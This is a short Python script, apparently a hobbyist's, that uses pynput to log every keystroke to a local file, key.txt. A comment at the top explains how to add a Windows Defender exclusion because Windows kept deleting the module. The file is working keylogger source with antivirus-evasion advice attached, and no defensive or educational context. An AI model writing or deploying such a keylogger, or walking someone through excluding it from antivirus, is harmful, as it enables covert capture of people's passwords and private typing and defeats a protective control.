# windows kept deleting this module so i did this:
    # Virus and Threat Protection -> scroll down & click on manage settings ->
    # Scroll down to Exclusions & click on add or remove exclusions

from pynput import keyboard

def log_keys():
    f = open("key.txt", "a")

    def on_press(key):
        if key == keyboard.Key.esc:
            return False  # stop listener
        else:
            print(str(key))
            if str(key) == "Key.space":
                write_this = ' '
            elif str(key) == "Key.enter":
                write_this = '\n'
            else:
                write_this = str(key)
            f.write(write_this + ",")
            
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # start to listen on a separate thread
    listener.join()